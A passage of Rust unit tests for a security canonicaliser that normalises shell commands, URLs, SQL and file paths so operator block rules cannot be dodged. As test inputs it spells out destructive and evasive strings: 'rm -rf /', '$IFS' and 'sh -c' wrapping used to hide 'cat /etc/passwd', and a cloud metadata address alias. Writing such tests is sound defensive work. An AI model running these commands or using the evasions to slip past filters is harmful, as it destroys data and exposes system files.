                heads_of(line),
                vec!["timeout"],
                "peeled past a non-duration operand: {line}"
            );
        }
        // The positive control, so this cannot pass by refusing every operand.
        assert!(heads_of("timeout 5 rm -rf /").contains(&"rm".to_string()));
    }

    /// Peeling terminates and never yields an empty vector, however many
    /// wrapper layers or trailing separators the input piles up.
    #[test]
    fn shell_argv_terminates_on_degenerate_input() {
        assert!(shell_argv("").is_empty());
        assert!(shell_argv(";;; | && ||").is_empty());
        assert!(argv_of("sudo").iter().all(|v| !v.is_empty()));
        assert!(argv_of("sudo sudo sudo sudo sudo sudo rm -rf /").len() <= 6);
        assert!(shell_argv(&normalize_shell("bash -c"))
            .iter()
            .all(|v| !v.is_empty()));
    }

    /// A statement separator is emitted BETWEEN clauses, never after the last
    /// one. A trailing `;` is ordinary shell, and a canonical form that grew a
    /// dangling separator would make `argv` offer an empty final token —
    /// shifting nothing, but pinning `argv[n]` rules against a position that
    /// does not exist on the same command written without the semicolon.
    #[test]
    fn a_trailing_separator_does_not_survive_canonicalisation() {
        assert_eq!(normalize_shell("rm -rf /;"), "rm -rf /");
        assert_eq!(normalize_shell("rm -rf / ;"), "rm -rf /");
        assert_eq!(normalize_shell("echo hi ; rm -rf /"), "echo hi ; rm -rf /");
        assert_eq!(normalize_shell("echo hi ; rm -rf / ;"), "echo hi ; rm -rf /");
        assert_eq!(normalize_shell("echo hi && rm -rf /"), "echo hi && rm -rf /");
    }

    /// `${IFS}` is the braced spelling of the same evasion as a bare `$IFS`.
    /// Both must expand: an operator's `argv[0] = rm` rule is dodged by
    /// whichever one the canonicaliser does not read.
    #[test]
    fn the_braced_ifs_expansion_is_read_like_the_bare_one() {
        assert_eq!(normalize_shell("cat${IFS}/etc/passwd"), "cat /etc/passwd");
        assert_eq!(normalize_shell("cat$IFS/etc/passwd"), "cat /etc/passwd");
        assert_eq!(normalize_shell("${IFS}cat /etc/passwd"), "cat /etc/passwd");
        assert_eq!(normalize_shell("rm${IFS}-rf${IFS}/"), "rm -rf /");
        // Any body up to the matching brace, per the documented scope.
        assert_eq!(normalize_shell("rm${IFS:0:1}-rf /"), "rm -rf /");
        // A missing close brace leaves the `$` literal rather than consuming
        // the rest of the command.
        assert_eq!(normalize_shell("rm${IFS-rf /"), "rm${IFS-rf /");
    }

    /// `sh -c '<inner>'` canonicalises the INNER command, because that is where
    /// the operator's rule has to match. Reading the wrong token as the inner
    /// script leaves the real command uncanonicalised and the wrapper doubled.
    #[test]
    fn a_dash_c_wrapper_canonicalises_the_command_it_wraps() {
        assert_eq!(normalize_shell("sh -c 'rm  -rf  /'"), "sh -c rm -rf /");
        assert_eq!(normalize_shell("bash -c \"cat$IFS/etc/passwd\""), "bash -c cat /etc/passwd");
        // Trailing positional args survive after the recursed inner script.
        assert_eq!(normalize_shell("sh -c 'echo  $0' name"), "sh -c echo $0 name");
    }

    /// The `-c` recursion belongs to programs that read their argument as a
    /// shell command. Applied to everything, `grep -c pattern` would be read as
    /// an execution step and `-c` flags across the whole tool surface would
    /// start recursing.
    #[test]
    fn only_a_shell_style_interpreter_reads_dash_c_as_a_command() {
        for prog in ["bash", "sh", "zsh", "ksh", "dash", "fish", "python", "python3", "ruby", "perl"] {
            assert!(is_shell_dash_c_interpreter(prog), "{prog}");
        }
        // Basename, so an absolute path resolves the same way.
        assert!(is_shell_dash_c_interpreter("/bin/bash"));
        assert!(is_shell_dash_c_interpreter("/usr/bin/python3"));
        // Everything else takes `-c` as its own flag.
        for prog in ["grep", "docker", "systemctl", "tar", "wc", "curl", ""] {
            assert!(!is_shell_dash_c_interpreter(prog), "{prog}");
        }
    }

    /// The `host:port` split is what lets a metadata alias be recognised when
    /// it carries a port — and the bracket guard is what stops it firing inside
    /// an IPv6 literal, where every colon is part of the address.
    #[test]
    fn a_host_is_split_from_its_port_but_never_inside_an_ipv6_literal() {
        // The alias resolves with and without an explicit port.
        assert!(normalize_url("http://metadata.google.internal/computeMetadata/v1/")
            .contains("169.254.169.254"));
        assert!(normalize_url("http://metadata.google.internal:80/computeMetadata/v1/")
            .contains("169.254.169.254"));
        // An IPv6 literal keeps its address intact — with a port and without.
        assert_eq!(normalize_url("http://[::1]:8080/x"), "http://[::1]:8080/x");
        assert_eq!(normalize_url("http://[fe80::1]/x"), "http://[fe80::1]/x");
        // Hex LETTERS after the final colon are what make the split observable: the
        // host half is lowercased and the port half is not, so a literal split in the
        // wrong place comes back with its case intact.
        assert_eq!(normalize_url("http://[FE80::AB]/x"), "http://[fe80::ab]/x");
        assert_eq!(normalize_url("http://[2001:db8::1]:443/a"), "http://[2001:db8::1]:443/a");
    }


    /// `--` starts a SQL line comment; a lone `-` is subtraction. Reading one
    /// hyphen as a comment marker would swallow the rest of the line — turning
    /// `where id = a-b` into `where id = a` and dropping whatever an operator's
    /// rule was written to match.
    #[test]
    fn a_lone_hyphen_is_arithmetic_and_only_a_pair_starts_a_comment() {
        assert_eq!(normalize_sql("select a-b from t"), "select a-b from t");
        assert_eq!(normalize_sql("select 1 - 2"), "select 1 - 2");
        assert_eq!(normalize_sql("select 1 -- drop table t\nfrom t"), "select 1 from t");
        // A trailing hyphen has no byte after it to inspect.
        assert_eq!(normalize_sql("select 1 -"), "select 1 -");
        assert_eq!(normalize_sql("-"), "-");
        assert_eq!(normalize_sql("--"), "");
    }

    /// A trailing separator is trimmed so `/etc/` and `/etc` cannot be two
    /// different things to a path rule — except at the root, which IS its own
    /// separator and must survive.
    #[test]
    fn a_trailing_separator_is_trimmed_everywhere_but_the_root() {
        assert_eq!(normalize_path("/etc/passwd/"), "/etc/passwd");
        assert_eq!(normalize_path("/etc/"), "/etc");
        assert_eq!(normalize_path("relative/dir/"), "relative/dir");
        assert_eq!(normalize_path("C:\\Windows\\"), "C:/Windows");
        // The boundary on the other side: root is one character and stays.
        assert_eq!(normalize_path("/"), "/");
        assert_eq!(normalize_path(""), "");
        // Nothing to trim.
        assert_eq!(normalize_path("/etc/passwd"), "/etc/passwd");
    }


    /// `..` never collapses past an anchor this code cannot resolve. `~` is deliberately
    /// NOT expanded here, so popping it would invent a parent directory the canonicaliser
    /// has no way to know — and a rule written against `~/…` would then be matched against
    /// a path the client never sent.
    ///
    /// `path_never_expands_the_home_anchor` states the same claim as a property, but it
    /// builds `~/{random}` and only exercises this branch when the generator happens to
    /// emit a `..` segment — so it kills a mutation here on some runs and not others.
    /// The property hunts the counterexample nobody wrote down; this pins the one we did.
    #[test]
    fn a_dotdot_never_collapses_past_an_unresolvable_anchor() {
        // The `~` anchor, and a `..` with no parent at all.
        assert_eq!(normalize_path("~/.."), "~/..");
        assert_eq!(normalize_path("~/a/../.."), "~/..");
        assert_eq!(normalize_path("../foo"), "../foo");
        assert_eq!(normalize_path("../.."), "../..");
        // The control: a `..` with a parent it CAN resolve collapses, or the assertions
        // above would keep passing with `..` handling removed entirely.
        assert_eq!(normalize_path("a/b/../c"), "a/c");
        assert_eq!(normalize_path("~/a/../b"), "~/b");
        // Rooted is the third case: escaping root is meaningless, so the `..` is dropped
        // rather than kept — a different answer from the two above, on purpose.
        assert_eq!(normalize_path("/.."), "/");
        assert_eq!(normalize_path("/a/../.."), "/");
    }

    /// A block comment ends at `*/` and at nothing else. A scan that stopped at the
    /// first `/` — or at whatever followed a `*` — would emit the comment's tail back
    /// into the canonical text, and a comment carrying a slash is entirely ordinary SQL.
    /// What leaks out is text the operator's keyword rules then read as statement.
    #[test]
    fn a_block_comment_ends_only_at_its_closing_delimiter() {
        for commented in [
            "select 1 /* a/b */ from t",
            "select 1 /* a*b */ from t",
            "select 1 /* 01/02/03 */ from t",
            "select 1 /* drop table t */ from t",
            "select 1 /* http://x/y */ from t",
        ] {
            let out = normalize_sql(commented);
            assert!(
                !out.contains('/') && !out.contains('*'),
                "{commented} left comment text behind: {out}"
            );
            assert!(!out.contains("drop"), "{commented} leaked a keyword: {out}");
        }
    }

    /// The expander's scope is `$IFS` and nothing else — the module says so in as many
    /// words. Widened to every `${…}`, it would rewrite `${HOME}` to a space and hand
    /// the matcher a command the client never sent, which is a bypass in the quiet
    /// direction: the rule stops seeing what it was written to catch.
    #[test]
    fn only_an_ifs_brace_expands_not_every_brace_expression() {
        for untouched in ["echo ${HOME}/x", "cat ${PATH}", "echo ${1}", "echo ${#}"] {
            assert!(
                normalize_shell(untouched).contains('$'),
                "{untouched} must survive the expander"
            );
        }
        assert_eq!(normalize_shell("echo ${HOME}/x"), "echo ${HOME}/x");
        // The control: an IFS body — any body — still expands, per the documented scope.
        assert_eq!(normalize_shell("echo ${IFS}x"), "echo x");
        assert_eq!(normalize_shell("rm${IFS:0:1}-rf /"), "rm -rf /");
    }

    /// `sh -c <cmd>` unwrapping is depth-bounded, and the bound is what keeps crafted
    /// nesting from costing unbounded work on attacker-supplied text. Both halves are
    /// pinned here — the cap itself, and the increment that reaches it — because a
    /// recursion that never deepens never trips its own guard.
    ///
    /// One nest, read at three depths: below the cap both wrappers come off; one below
    /// it the outer comes off and the inner is only whitespace-normalised, so its
    /// quoting survives; at the cap nothing is interpreted at all.
    #[test]
    fn the_dash_c_unwrapping_stops_at_its_recursion_cap() {
        let nested = "sh -c \"sh -c 'rm  -rf  /'\"";
        for below in 0..SHELL_MAX_RECURSION - 1 {
            assert_eq!(
                normalize_shell_at(nested, below),
                "sh -c sh -c rm -rf /",
                "depth {below} is below the cap — both wrappers come off"
            );
        }
        assert_eq!(
            normalize_shell_at(nested, SHELL_MAX_RECURSION - 1),
            "sh -c sh -c 'rm -rf /'",
            "one below the cap: the inner recursion is handed the cap, so it only \
             normalises whitespace and the inner quoting survives"
        );
        for at_or_past in [SHELL_MAX_RECURSION, SHELL_MAX_RECURSION + 1] {
            assert_eq!(
                normalize_shell_at(nested, at_or_past),
                "sh -c \"sh -c 'rm -rf /'\"",
                "depth {at_or_past} is at or past the cap — nothing is interpreted"
            );
        }
    }
}
